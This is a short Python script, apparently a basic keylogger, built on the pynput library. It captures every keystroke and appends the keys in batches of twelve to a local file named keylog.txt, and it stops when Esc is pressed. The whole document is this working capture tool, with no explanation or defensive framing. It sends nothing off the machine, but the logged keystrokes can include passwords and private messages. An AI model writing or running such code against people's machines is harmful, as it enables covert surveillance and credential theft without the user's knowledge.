from pynput.keyboard import Key, Listener

keys = []
char_count = 0

def write_to_file(keys_pressed):
	with open("keylog.txt", "a") as keylog:
		for key in keys_pressed:
			key_string = str(key)
			if (key_string == "\"'\""):
				parsed_key = key_string.strip('\"')
			else:
				parsed_key = key_string.strip('\'')
			keylog.write(parsed_key)
	keylog.close()

def key_press(key):
	global keys, char_count
	MAX_COUNT = 12

	keys.append(key)
	char_count += 1

	if char_count >= MAX_COUNT:
		write_to_file(keys)
		char_count = 0
		keys = []

def key_release(key):
	if key == Key.esc:
		return False

with Listener(on_press = key_press, on_release = key_release) as listener:
	listener.join()